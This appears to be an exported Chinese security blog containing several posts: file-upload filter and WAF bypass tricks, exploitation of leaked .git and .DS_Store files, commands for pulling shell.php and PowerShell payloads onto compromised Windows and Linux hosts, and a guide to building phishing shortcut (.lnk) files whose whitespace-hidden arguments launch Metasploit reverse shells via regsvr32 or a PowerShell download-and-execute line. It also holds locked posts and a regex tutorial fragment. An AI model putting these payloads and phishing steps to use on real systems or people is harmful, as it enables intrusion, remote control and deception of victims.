<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#PHP    </span><br><span class="line">&lt;?php Include(&quot;上传的txt文件路径&quot;);?&gt; </span><br><span class="line">#ASP    </span><br><span class="line">&lt;!--#include file&#x3D;&quot;上传的txt文件路径&quot; --&gt;</span><br><span class="line">#JSP    </span><br><span class="line">&lt;jsp:inclde page&#x3D;&quot;上传的txt文件路径&quot;&#x2F;&gt;</span><br><span class="line">or  </span><br><span class="line">&lt;%@include file&#x3D;&quot;上传的txt文件路径&quot;%&gt;</span><br></pre></td></tr></table></figure>

<h4 id="配合服务器解析漏洞"><a href="#配合服务器解析漏洞" class="headerlink" title="配合服务器解析漏洞"></a>配合服务器解析漏洞</h4><p><a href="http://www.cnblogs.com/shellr00t/p/6426856.html" target="_blank" rel="noopener">看这篇博客</a></p>
<h4 id="配合操作系统文件命令规则"><a href="#配合操作系统文件命令规则" class="headerlink" title="配合操作系统文件命令规则"></a>配合操作系统文件命令规则</h4><ul>
<li><p>上传不符合windows文件命名规则的文件名</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">test.asp.</span><br><span class="line">test.asp(空格)</span><br><span class="line">test.php:1.jpg</span><br><span class="line">test.php::$DATA</span><br><span class="line">shell.php::$DATA…….</span><br></pre></td></tr></table></figure>
<p>会被windows系统自动去掉不符合规则符号后面的内容。</p>
</li>
<li><p>linux下后缀名大小写<br>在linux下，如果上传php不被解析，可以试试上传pHp后缀的文件名。</p>
</li>
</ul>
<h4 id="CMS、编辑器漏洞"><a href="#CMS、编辑器漏洞" class="headerlink" title="CMS、编辑器漏洞"></a>CMS、编辑器漏洞</h4><ul>
<li>CMS漏洞：比如说JCMS等存在的漏洞，可以针对不同CMS存在的上传漏洞进行绕过。</li>
<li>编辑器漏洞：比如FCK，ewebeditor等，可以针对编辑器的漏洞进行绕过。</li>
<li>参考以下链接：<br> <a href="https://www.leavesongs.com/PENETRATION/UseOfFckeditor.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/UseOfFckeditor.html</a><br> <a href="http://shack2.org/article/183.html" target="_blank" rel="noopener">http://shack2.org/article/183.html</a><br> <a href="http://www.cnbraid.com/2015/fckeditor.html" target="_blank" rel="noopener">http://www.cnbraid.com/2015/fckeditor.html</a><br><a href="https://docs.google.com/document/d/1w_61xR8U7nmn4Y0CvBHpG1uFIU2ORx69QnqTxQt8Km0/edit?pli=1" target="_blank" rel="noopener">https://docs.google.com/document/d/1w_61xR8U7nmn4Y0CvBHpG1uFIU2ORx69QnqTxQt8Km0/edit?pli=1</a></li>
</ul>
<h4 id="配合其他规则"><a href="#配合其他规则" class="headerlink" title="配合其他规则"></a>配合其他规则</h4><ul>
<li><p><strong>0x00截断：</strong>基于一个组合逻辑漏洞造成的，通常存在于构造上传文件路径的时候</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">test.php(0x00).jpg</span><br><span class="line">　test.php%00.jpg</span><br><span class="line">　路径&#x2F;upload&#x2F;1.php(0x00)，文件名1.jpg，结合&#x2F;upload&#x2F;1.php(0x00)&#x2F;1.jpg</span><br></pre></td></tr></table></figure>
<p>伪代码演示：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">name&#x3D; getname(httprequest) &#x2F;&#x2F;假如这时候获取到的文件名是 help.asp.jpg(asp 后面为 0x00)</span><br><span class="line">type &#x3D;gettype(name)        &#x2F;&#x2F;而在 gettype()函数里处理方式是从后往前扫描扩展名，所以判断为 jpg</span><br><span class="line">if(type &#x3D;&#x3D; jpg)</span><br><span class="line">   SaveFileToPath(UploadPath.name, name)   &#x2F;&#x2F;但在这里却是以 0x00 作为文件名截断</span><br><span class="line">&#x2F;&#x2F;最后以 help.asp 存入路径里</span><br></pre></td></tr></table></figure>

</li>
</ul>
<ul>
<li><strong>.htaccesss</strong><br>上传当前目录的<code>.htaccess</code> 文件<br>例如内容为： <code>AddType application/x-http-php .jpg</code>  (上传的jpg 均以php执行)<br>把<code>.htaccess</code> 上传后，且上传成功后，再上传内容为一句话的<code>jpg</code>文件</li>
</ul>
<h4 id="WAF绕过"><a href="#WAF绕过" class="headerlink" title="WAF绕过"></a>WAF绕过</h4><h4 id="垃圾数据"><a href="#垃圾数据" class="headerlink" title="垃圾数据"></a>垃圾数据</h4><p>有些主机WAF软件为了不影响web服务器的性能，会对校验的用户数据设置大小上限，比如1M。此种情况可以构造一个大文件，前面1M的内容为垃圾内容，后面才是真正的木马内容，便可以绕过WAF对文件内容的校验；<br><img src="/posts/62304/%E7%BB%95%E8%BF%871.png" alt></p>
<p>当然也可以将垃圾数据放在数据包最开头，这样便可以绕过对文件名的校验。<br><img src="/posts/62304/%E7%BB%95%E8%BF%872.png" alt></p>
<p>可以将垃圾数据加上Content-Disposition参数后面，参数内容过长，可能会导致waf检测出错。</p>
<h4 id="filename"><a href="#filename" class="headerlink" title="filename"></a>filename</h4><p>针对早期版本安全狗，可以多加一个filename。<br><img src="/posts/62304/%E7%BB%95%E8%BF%873.png" alt></p>
<p>或者将filename换位置，在IIS6.0下如果我们换一种书写方式，把filename放在其他地方：<br><img src="/posts/62304/%E7%BB%95%E8%BF%874.png" alt></p>
<h4 id="POST-GET"><a href="#POST-GET" class="headerlink" title="POST/GET"></a>POST/GET</h4><p>有些WAF的规则是：如果数据包为POST类型，则校验数据包内容。<br>此种情况可以上传一个POST型的数据包，抓包将POST改为GET。</p>
<h4 id="利用waf本身缺陷"><a href="#利用waf本身缺陷" class="headerlink" title="利用waf本身缺陷"></a>利用waf本身缺陷</h4><p>删除实体里面的Conten-Type字段<br><img src="/posts/62304/%E7%BB%95%E8%BF%875.png" alt></p>
<p>第一种是删除Content整行，第二种是删除C后面的字符。删除掉ontent-Type: image/jpeg只留下c，将.php加c后面即可，但是要注意额，双引号要跟着c.php。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">正常包：Content-Disposition: form-data; name&#x3D;&quot;image&quot;; filename&#x3D;&quot;085733uykwusqcs8vw8wky.png&quot;Content-Type: image&#x2F;png</span><br><span class="line">构造包：Content-Disposition: form-data; name&#x3D;&quot;image&quot;; filename&#x3D;&quot;085733uykwusqcs8vw8wky.png</span><br><span class="line">C.php&quot;</span><br></pre></td></tr></table></figure>
<p>删除Content-Disposition字段里的空格<br><img src="/posts/62304/%E7%BB%95%E8%BF%876.png" alt></p>
]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>文件上传</tag>
      </tags>
  </entry>
  <entry>
    <title>文件泄露漏洞</title>
    <url>/posts/56132.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>前两天刚做了一道<code>.git</code>文件泄露的题，在网上查了些资料，发现还有其他的文件泄露漏洞，现在来总结一下。</p>
<h2 id="GitHub导致文件泄露"><a href="#GitHub导致文件泄露" class="headerlink" title="GitHub导致文件泄露"></a>GitHub导致文件泄露</h2><h3 id="漏洞成因及危害"><a href="#漏洞成因及危害" class="headerlink" title="漏洞成因及危害"></a>漏洞成因及危害</h3><p>在Github中被泄露的敏感信息主要包括以下几类：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">邮箱信息</span><br><span class="line">SVN信息</span><br><span class="line">内部账号及密码</span><br><span class="line">数据库连接信息</span><br><span class="line">服务器配置信息</span><br></pre></td></tr></table></figure>
<p>这些敏感信息有的只是导致一些无法被外网连接的内网账户信息或者数据库连接信息泄露，但时也可能会导致公司重要的商业秘密或程序源代码被他人窃取，管理员账户被控制或者数据库泄露等，造成巨大的损失。</p>
<p>###漏洞检测及利用<br>site:Github.com smtp<br>google hacker语法</p>
<h2 id="git导致文件泄露"><a href="#git导致文件泄露" class="headerlink" title="git导致文件泄露"></a>git导致文件泄露</h2><h3 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>在运行git init初始化代码库的时候，会在当前目录下面产生一个.git的隐藏文件，用来记录代码的变更记录等等。在发布代码的时候，把.git这个目录没有删除，直接发布了。使用这个文件，可以用来<em>恢复源代码</em>。</p>
<h3 id="方法一："><a href="#方法一：" class="headerlink" title="方法一："></a>方法一：</h3><p>下载.git文件：</p>
<p><code>wget --mirror --include-directories=/.git http://www.target.com/.gitcd www.target.com</code></p>
<p>代码重构：</p>
<p><code>git reset --hard</code></p>
<h3 id="方法二："><a href="#方法二：" class="headerlink" title="方法二："></a>方法二：</h3><p><code>Python2 GitHack.py http://www.xxx.com/.git/</code></p>
<p>GitHack.py下载地址：<code>https://github.com/lijiejie/GitHack</code></p>
<h2 id="svn导致文件泄露"><a href="#svn导致文件泄露" class="headerlink" title="svn导致文件泄露"></a>svn导致文件泄露</h2><p>Subversion，简称SVN，是一个开放源代码的版本控制系统，相对于的RCS、CVS，采用了分支管理系统，它的设计目标就是取代CVS。互联网上越来越多的控制服务从CVS转移到Subversion。<br>Subversion使用服务端—客户端的结构，当然服务端与客户端可以都运行在同一台服务器上。在服务端是存放着所有受控制数据的Subversion仓库，另一端是Subversion的客户端程序，管理着受控数据的一部分在本地的映射（称为“工作副本”）。在这两端之间，是通过各种仓库存取层（Repository Access，简称RA）的多条通道进行访问的。这些通道中，可以通过不同的网络协议，例如HTTP、SSH等，或本地文件的方式来对仓库进行操作。</p>
<p>工具下载：<code>https://github.com/lijiejie/ds_store_exp</code></p>
<h2 id="DS-Store导致文件泄露"><a href="#DS-Store导致文件泄露" class="headerlink" title="DS_Store导致文件泄露"></a>DS_Store导致文件泄露</h2><h3 id="漏洞成因-1"><a href="#漏洞成因-1" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>在发布代码时未删除文件夹中隐藏的.DS_store，被发现后，获取了敏感的文件名等信息。</p>
<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>下载地址：<code>https://github.com/lijiejie/ds_store_exp</code></p>
<p>使用：<code>ds_store_exp.py http://www.xxx.com/.DS_Store</code></p>
<h2 id="网站备份压缩文件"><a href="#网站备份压缩文件" class="headerlink" title="网站备份压缩文件"></a>网站备份压缩文件</h2><p>在网站的使用过程中，往往需要对网站中的文件进行修改、升级。此时就需要对网站整站或者其中某一页面进行备份。当备份文件或者修改过程中的缓存文件因为各种原因而被留在网站web目录下，而该目录又没有设置访问权限时，便有可能导致备份文件或者编辑器的缓存文件被下载，导致敏感信息泄露，给服务器的安全埋下隐患。</p>
<h3 id="漏洞成因及危害："><a href="#漏洞成因及危害：" class="headerlink" title="漏洞成因及危害："></a>漏洞成因及危害：</h3><p>该漏洞的成因主要有以下两种：<br>服务器管理员错误地将网站或者网页的备份文件放置到服务器web目录下。<br>编辑器在使用过程中自动保存的备份文件或者临时文件因为各种原因没有被删除而保存在web目录下。</p>
<h3 id="漏洞检测："><a href="#漏洞检测：" class="headerlink" title="漏洞检测："></a>漏洞检测：</h3><p>该漏洞往往会导致服务器整站源代码或者部分页面的源代码被下载，利用。源代码中所包含的各类敏感信息，如服务器数据库连接信息，服务器配置信息等会因此而泄露，造成巨大的损失。被泄露的源代码还可能会被用于代码审计，进一步利用而对整个系统的安全埋下隐患。<br>.rar、.zip、.7z、.tar.gz、.bak、.swp、.txt、.html</p>
]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>源码泄露</tag>
      </tags>
  </entry>
  <entry>
    <title>文件上传(二)之实战篇</title>
    <url>/posts/31481.html</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近打了场XCTF，看到同学在群里交流，自己不自觉留下来没有技术的泪水。。。<br>好吧，那就开始学吧。。。在网上找到一个不错的上传漏洞汇总的靶场，在本地搭建好环境，开始闭关。。。。。。</p>
<p>靶场源码地址：<code>github.com/c0ny1/upload-labs</code></p>
<p>我下载的是靶主已经集成配置好的环境进行本地搭建。</p>
<p>地址：<code>github.com/c0ny1/upload-labs/releases</code></p>
<p><img src="/posts/31481/%E4%B8%8A%E4%BC%A01.png" alt="界面"></p>
<h1 id="Pass-01"><a href="#Pass-01" class="headerlink" title="Pass-01"></a>Pass-01</h1><p><img src="/posts/31481/%E4%B8%8A%E4%BC%A02.jpg" alt><br>上传一个<code>2.php</code>文件<br><img src="/posts/31481/%E4%B8%8A%E4%BC%A03.jpg" alt><br>查看提示：<br><img src="/posts/31481/%E4%B8%8A%E4%BC%A03.jpg" alt></p>
<p>查看源码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function checkFile() &#123;</span><br><span class="line">    var file &#x3D; document.getElementsByName(&#39;upload_file&#39;)[0].value;</span><br><span class="line">    if (file &#x3D;&#x3D; null || file &#x3D;&#x3D; &quot;&quot;) &#123;</span><br><span class="line">        alert(&quot;请选择要上传的文件!&quot;);</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">    &#x2F;&#x2F;定义允许上传的文件类型</span><br><span class="line">    var allow_ext &#x3D; &quot;.jpg|.png|.gif&quot;;</span><br><span class="line">    &#x2F;&#x2F;提取上传文件的类型</span><br><span class="line">    var ext_name &#x3D; file.substring(file.lastIndexOf(&quot;.&quot;));</span><br><span class="line">    &#x2F;&#x2F;判断上传文件类型是否允许上传</span><br><span class="line">    if (allow_ext.indexOf(ext_name + &quot;|&quot;) &#x3D;&#x3D; -1) &#123;</span><br><span class="line">        var errMsg &#x3D; &quot;该文件不允许上传，请上传&quot; + allow_ext + &quot;类型的文件,当前文件类型为：&quot; + ext_name;</span><br><span class="line">        alert(errMsg);</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>发现只允许上传<code>.jpg|.png|.gif</code>类型的文件</p>
<p>未完。。。。。。</p>
]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>文件上传</tag>
      </tags>
  </entry>
  <entry>
    <title>文件下载</title>
    <url>/posts/18452.html</url>
    <content><![CDATA[<h1 id="文件下载"><a href="#文件下载" class="headerlink" title="文件下载"></a>文件下载</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>对于渗透测试来说，当我们拿到的目标权限过低，会很难进行下一步动作，便需要使用其他利器继续进行提权等操作，当需要将文件下载到目标机器时，就会用到文件下载命令。</p>
<h2 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h2><h3 id="0x00-certutil"><a href="#0x00-certutil" class="headerlink" title="0x00 certutil"></a>0x00 certutil</h3><p>certutil.exe是一个命令行工具，作为Windows server 2003家族证书服务的一部分安装。</p>
<p><strong>命令详解</strong></p>
<p>certutil -urlcache -split -f <a href="http://192.168.72.10/shell.php" target="_blank" rel="noopener">http://192.168.72.10/shell.php</a></p>
<p>将shell.php下载当当前目录</p>
<p>该命令适用于 server 2003以上版本</p>
<h3 id="0x01-bitsadmin"><a href="#0x01-bitsadmin" class="headerlink" title="0x01 bitsadmin"></a>0x01 bitsadmin</h3><p>BITSAdmin是一个命令行工具，可用于创建下载或上传作业并监视其进度。</p>
<p><strong>命令详解</strong></p>
<p><code>bitsadmin /transfer myDownLoadJob /download /priority normal &quot;http://192.168.72.10/shell.php&quot; &quot;E:\phpstudy_pro\WWW\shell.php&quot;</code></p>
<p>将shell.php下载到E:\phpstudy_pro\WWW\目录</p>
<p>该命令适用于win 7以上版本</p>
<h3 id="0x02-powersehll"><a href="#0x02-powersehll" class="headerlink" title="0x02 powersehll"></a>0x02 powersehll</h3><p><strong>命令详解</strong></p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">powershell(<span class="built_in">new-object</span> Net.WebClient).DownloadFile(<span class="string">'http://192.168.72.10/shell.php'</span>,<span class="string">'E:\phpstudy_pro\WWW\shell.php'</span>)</span><br></pre></td></tr></table></figure>

<p>将shell.php脚本下载到当前目录</p>
<p>该命令适用于server 2003以上版本</p>
<h3 id="0x03-vbs"><a href="#0x03-vbs" class="headerlink" title="0x03 vbs"></a>0x03 vbs</h3><ul>
<li>第一种</li>
</ul>
<figure class="highlight vbs"><table><tr><td class="code"><pre><span class="line">echo <span class="keyword">Set</span> Post = <span class="built_in">CreateObject</span>(<span class="string">"Msxml2.XMLHTTP"</span>) &gt;&gt;download.vbs</span><br><span class="line">echo <span class="keyword">Set</span> Shell = <span class="built_in">CreateObject</span>(<span class="string">"Wscript.Shell"</span>) &gt;&gt;download.vbs</span><br><span class="line">echo Post.Open <span class="string">"GET"</span>,<span class="string">"http://192.168.203.140/a.ps1"</span>,<span class="number">0</span> &gt;&gt;download.vbs</span><br><span class="line">echo Post.Send() &gt;&gt;download.vbs</span><br><span class="line">echo <span class="keyword">Set</span> aGet = <span class="built_in">CreateObject</span>(<span class="string">"ADODB.Stream"</span>) &gt;&gt;download.vbs</span><br><span class="line">echo aGet.Mode = <span class="number">3</span> &gt;&gt;download.vbs</span><br><span class="line">echo aGet.Type = <span class="number">1</span> &gt;&gt;download.vbs</span><br><span class="line">echo aGet.Open() &gt;&gt;download.vbs</span><br><span class="line">echo aGet.Write(Post.responseBody) &gt;&gt;download.vbs</span><br><span class="line">echo aGet.SaveToFile <span class="string">"D:/a.ps1"</span>,<span class="number">2</span> &gt;&gt;download.vbs</span><br></pre></td></tr></table></figure>

<p>把下载地址直接echo输入download.vbs。直接下载即可</p>
<p>该命令适用于server 2003以上版本</p>
<ul>
<li>第二种</li>
</ul>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line"># echo <span class="keyword">set</span> a=<span class="built_in">createobject</span>(^<span class="string">"adod^"</span>+^<span class="string">"b.stream^"</span>):<span class="keyword">set</span> w=<span class="built_in">createobject</span>(^<span class="string">"micro^"</span>+^<span class="string">"soft.xmlhttp^"</span>):w.open^<span class="string">"get^"</span>,wsh.arguments(<span class="number">0</span>),<span class="number">0</span>:w.send:a.type=<span class="number">1</span>:a.open:a.write w.responsebody:a.savetofile wsh.arguments(<span class="number">1</span>),<span class="number">2</span>  &gt;&gt; downfile.vbs</span><br><span class="line"># cscript downfile.vbs http://192.168.203.140/a.ps1 D:\\tomcat8.5\\webapps\\x.ps1</span><br></pre></td></tr></table></figure>

<p>保存脚本后再下载指定文件</p>
<p>该命令适用于server 2003以上版本</p>
<h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h2><h3 id="0x00-curl"><a href="#0x00-curl" class="headerlink" title="0x00 curl"></a>0x00 curl</h3><p><strong>基本用法</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># curl http:&#x2F;&#x2F;www.linux.com</span><br></pre></td></tr></table></figure>

<p>执行后，<a href="http://www.linux.com" target="_blank" rel="noopener">www.linux.com</a> 的html就会显示在屏幕上了</p>
<p>保存访问的网页</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># curl http:&#x2F;&#x2F;www.linux.com &gt;&gt; linux.html</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># curl -o linux.html http:&#x2F;&#x2F;www.linux.com</span><br></pre></td></tr></table></figure>

<h3 id="0x01-wget"><a href="#0x01-wget" class="headerlink" title="0x01 wget"></a>0x01 wget</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># wget -p &#x2F;etc http:&#x2F;&#x2F;192.168.72.10&#x2F;shell.php</span><br></pre></td></tr></table></figure>

<p>下载文件到 /etc 文件夹下</p>
]]></content>
  </entry>
  <entry>
    <title>日常记录</title>
    <url>/posts/42951.html</url>
    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <div class="hbe-input-container">
  <input type="password" id="hbePass" placeholder="" />
    <label for="hbePass">输入密码，查看文章！</label>
    <div class="bottom-line"></div>
  </div>
  <script id="hbeData" type="hbeData" data-hmacdigest="f4f25515922814b31789af777e8cc081f949bd50de753aaf64e1e2b4b1866cac">8de2c04a2d70dba63f65a56a98175f4a</script>
</div>
<script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>总结</category>
      </categories>
  </entry>
  <entry>
    <title>日志</title>
    <url>/posts/32353.html</url>
    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <div class="hbe-input-container">
  <input type="password" id="hbePass" placeholder="" />
    <label for="hbePass">输入密码，查看文章！</label>
    <div class="bottom-line"></div>
  </div>
  <script id="hbeData" type="hbeData" data-hmacdigest="eaf875a379cb5560bf0d802048b65531b01b30addec9ed05b43f848823abc1c3"></script>
</div>
<script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>日志</category>
      </categories>
      <tags>
        <tag>日志</tag>
      </tags>
  </entry>
  <entry>
    <title>构造windows快捷方式钓鱼信</title>
    <url>/posts/44104.html</url>
    <content><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>关于windows快捷方式,想必这里就不用再多说了,大家应该已经非常了解才是,说白点,它其实就是一种路径映射而已,而我们利用的也正是这种特性,触发细节很简单,这里不妨简单回顾下,当我们双击打开一个windows快捷方式时内部到底都发生了些什么,首先,windows会根据快捷方式中指定的路径去触发执行相应的程序,假如我们指向的是一个包含恶意的payload路径,那结果就可想而知,payload肯定会被正常执行</p>
<h2 id="0x01-生成快捷方式"><a href="#0x01-生成快捷方式" class="headerlink" title="0x01 生成快捷方式"></a>0x01 生成快捷方式</h2><p>新建 test.txt 文件，内容如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cmd &#x2F;c calc</span><br></pre></td></tr></table></figure>
<p>新建 test.ps1 文件，右键powershell运行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$file &#x3D; Get-Content &quot;test.txt&quot;</span><br><span class="line">$WshShell &#x3D; New-Object -comObject WScript.Shell</span><br><span class="line">$Shortcut &#x3D; $WshShell.CreateShortcut(&quot;test.lnk&quot;)</span><br><span class="line">$Shortcut.TargetPath &#x3D; &quot;%SystemRoot%\system32\cmd.exe&quot;</span><br><span class="line">$Shortcut.IconLocation &#x3D; &quot;%SystemRoot%\System32\Shell32.dll,21&quot;</span><br><span class="line">$Shortcut.Arguments &#x3D; &#39;                                                                                                                                                                                                                                    &#39;+ $file</span><br><span class="line">$Shortcut.Save()</span><br></pre></td></tr></table></figure>
<p>生成 test.lnk 文件，而且图标改了（powershell执行文件要和test.txt要在一个目录下，这个图标所在位置就在%SystemRoot%\System32\Shell32.dll目录下）</p>
<p>双击 test.lnk ，调用计算器<br><img src="/posts/44104/1.png" alt></p>
<h2 id="0x02-借助windows快捷方式实现beacon上线"><a href="#0x02-借助windows快捷方式实现beacon上线" class="headerlink" title="0x02 借助windows快捷方式实现beacon上线"></a>0x02 借助windows快捷方式实现beacon上线</h2><p>先创建一个powershell的payload</p>
<p>Attacks –&gt; Packages –&gt; payload Generator<br><img src="/posts/44104/2.png" alt></p>
<p>将生成的代码替换掉 calc，运行 test.ps1，生成 test.lnk<br>双击 test.lnk，反弹shell<br><img src="/posts/44104/3.png" alt></p>
<h2 id="0x02-借助windows快捷方式实现meterpreter上线"><a href="#0x02-借助windows快捷方式实现meterpreter上线" class="headerlink" title="0x02 借助windows快捷方式实现meterpreter上线"></a>0x02 借助windows快捷方式实现meterpreter上线</h2><p>先用msf去生成payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msf &gt; use exploit&#x2F;multi&#x2F;script&#x2F;web_delivery </span><br><span class="line">msf &gt; set target  3</span><br><span class="line">msf &gt; set payload windows&#x2F;meterpreter&#x2F;reverse_tcp_rc4_dns </span><br><span class="line">msf &gt; set lhost 192.168.3.29</span><br><span class="line">msf &gt; set lport 82</span><br><span class="line">msf &gt; set rc4password  klionsec</span><br><span class="line">msf exploit(multi&#x2F;script&#x2F;web_delivery) &gt; exploit -j</span><br><span class="line">[*] Exploit running as background job 0.</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.3.29:82 </span><br><span class="line">msf exploit(multi&#x2F;script&#x2F;web_delivery) &gt; [*] Using URL: http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;qQJvcDScrbA</span><br><span class="line">[*] Local IP: http:&#x2F;&#x2F;192.168.3.29:8080&#x2F;qQJvcDScrbA</span><br><span class="line">[*] Server started.</span><br><span class="line">[*] Run the following command on the target machine:</span><br><span class="line">regsvr32 &#x2F;s &#x2F;n &#x2F;u &#x2F;i:http:&#x2F;&#x2F;192.168.3.29:8080&#x2F;qQJvcDScrbA.sct scrobj.dll	将此命令单独写到meter.txt文件中去生成快捷方式</span><br></pre></td></tr></table></figure>
<p>生成快捷方式，双击执行</p>
<h2 id="0x03-借助windows快捷方式实现自定义木马上线"><a href="#0x03-借助windows快捷方式实现自定义木马上线" class="headerlink" title="0x03 借助windows快捷方式实现自定义木马上线"></a>0x03 借助windows快捷方式实现自定义木马上线</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">powershell.exe (New-Object System.Net.WebClient).DownloadFile(&#39;http:&#x2F;&#x2F;192.168.72.23&#x2F;&#x2F;PsExec.exe&#39;,&#39;c:\\temp\\PsExec.exe&#39;);(New-Object -com Shell.Application).ShellExecute(&#39;c:\\temp\\PsExec.exe&#39;)</span><br></pre></td></tr></table></figure>]]></content>
  </entry>
  <entry>
    <title>易错知识</title>
    <url>/posts/34260.html</url>
    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <div class="hbe-input-container">
  <input type="password" id="hbePass" placeholder="" />
    <label for="hbePass">输入密码，查看文章！</label>
    <div class="bottom-line"></div>
  </div>
  <script id="hbeData" type="hbeData" data-hmacdigest="f4f25515922814b31789af777e8cc081f949bd50de753aaf64e1e2b4b1866cac">8de2c04a2d70dba63f65a56a98175f4a</script>
</div>
<script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
  </entry>
  <entry>
    <title>正则表达式</title>
    <url>/posts/46563.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>&#160; &#160; &#160; 字符串是编程时涉及到的最多的一种数据结构，对字符串进行操作的需求几乎无处不在。比如判断一个字符串是否是合法的Email地址，虽然可以编程提取@前后的子串，再分别判断是否是单词和域名，但这样做不但麻烦，而且代码难以复用。<a id="more"></a><br>&#160; &#160; &#160; 正则表达式是一种用来匹配字符串的强有力的武器。它的设计思想是用一种描述性的语言来给字符串定义一个规则，凡是符合规则的字符串，我们就认为它“匹配”了，否则，该字符串就是不合法的。</p>
<h2 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h2><p>&#160; &#160; &#160; 构造正则表达式的方法和创建数学表达式的方法一样。也就是用多种元字符与运算符可以将小的表达式结合在一起来创建更大的表达式。正则表达式的组件可以是单个的字符、字符集合、字符范围、字符间的选择或者所有这些组件的任意组合。</p>
<p>&#160; &#160; &#160; 正则表达式是由普通字符（例如字符 a 到 z）以及特殊字符（称为”元字符”）组成的文字模式。模式描述在搜索文本时要匹配的一个或多个字符串。正则表达式作为一个模板，将某个字符模式与所搜索的字符串进行匹配。</p>
<h3 id="普通字符"><a href="#普通字符" class="headerlink" title="普通字符"></a>普通字符</h3><p>&#160; &#160; &#160; 普通字符包括没有显式指定为元字符的所有可打印和不可打印字符。这包括所有大写和小写字母、所有数字、所有标点符号和一些其他符号。</p>
<h3 id="非打印字符"><a href="#非打印字符" class="headerlink" title="非打印字符"></a>非打印字符</h3><p>&#160; &#160; &#160; 非打印字符也可以是正则表达式的组成部分。下表列出了表示非打印字符的转义序列：</p>
<table>
<thead>
<tr>
<th align="center">字符</th>
<th align="center">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="center">\cx</td>
<td align="center">匹配由x指明的控制字符。例如， \cM 匹配一个 Control-M 或回车符。x 的值必须为 A-Z 或 a-z 之一。否则，将 c 视为一个原义的 ‘c’ 字符。</td>
</tr>
<tr>
<td align="center">\f</td>
<td align="center">匹配一个换页符。等价于 \x0c 和 \cL。</td>
</tr>
<tr>
<td align="center">\n</td>
<td align="center">匹配一个换行符。等价于 \x0a 和 \cJ。</td>
</tr>
<tr>
<td align="center">\r</td>
<td align="center">匹配一个回车符。等价于 \x0d 和 \cM。</td>
</tr>
<tr>
<td align="center">\s</td>
<td align="center">匹配任何空白字符，包括空格、制表符、换页符等等。等价于 [ \f\n\r\t\v]。注意 Unicode 正则表达式会匹配全角空格符。</td>
</tr>
<tr>
<td align="center">\S</td>
<td align="center">匹配任何非空白字符。等价于 [^ \f\n\r\t\v]。</td>
</tr>
<tr>
<td align="center">\t</td>
<td align="center">匹配一个制表符。等价于 \x09 和 \cI。</td>
</tr>
<tr>
<td align="center">\v</td>
<td align="center">匹配一个垂直制表符。等价于 \x0b 和 \cK。</td>
</tr>
<tr>
<td align="center">### 特殊字符</td>
<td align="center"></td>
</tr>
</tbody></table>
<p>&#160; &#160; &#160; 许多元字符要求在试图匹配它们时特别对待。若要匹配这些特殊字符，必须首先使字符”转义”，即，将反斜杠字符\ 放在它们前面。下表列出了正则表达式中的特殊字符：</p>
<table>
<thead>
<tr>
<th align="center">特殊字符</th>
<th align="center">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="center">$</td>
